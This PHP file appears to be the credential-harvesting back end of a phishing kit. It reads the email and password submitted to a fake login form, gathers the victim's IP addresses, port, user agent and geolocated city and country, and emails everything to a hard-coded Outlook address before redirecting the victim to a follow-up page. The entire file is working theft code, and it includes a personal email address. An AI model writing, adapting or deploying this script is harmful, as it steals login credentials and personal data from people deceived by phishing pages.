<?php  

$message = " ";
$logn = $_POST["email"];
$passd = $_POST["password"];

$ipaddress = $_SERVER["HTTP_CLIENT_IP"];
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$ips = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$port = $_SERVER['REMOTE_PORT'];


$geopluginURL='http://www.geoplugin.net/php.gp?ip='.$ips;
$addrDetailsArr = unserialize(file_get_contents($geopluginURL)); 

/*Get City name by return array*/
$city = $addrDetailsArr['geoplugin_city']; 

/*Get Country name by return array*/
$country = $addrDetailsArr['geoplugin_countryName'];

$message .= "Email Address: " . $logn . "
"; 

$message .= "Password: " . $passd . "
"; 

$message .= "Ip Address: " . $ipaddress . "
";
$message .= "ip: " . $ip . "
";
$message .= "ips " . $ips . "
";

$message .= "port: " . $port . "
";
$message .= "useragent: " . $useragent . "
";


	
	$subject = "New Log Submission from $ips in $city, $country";
    
    $myEmail = "kevin.loo7@outlook.com";	
	if (mail($myEmail, $subject, $message)){
		$logn = $_POST["email"];
        header("location:in.php?email=$logn&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");

    
    }else{
        header("location:in.php?email=$logn&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465");
	}
 

?>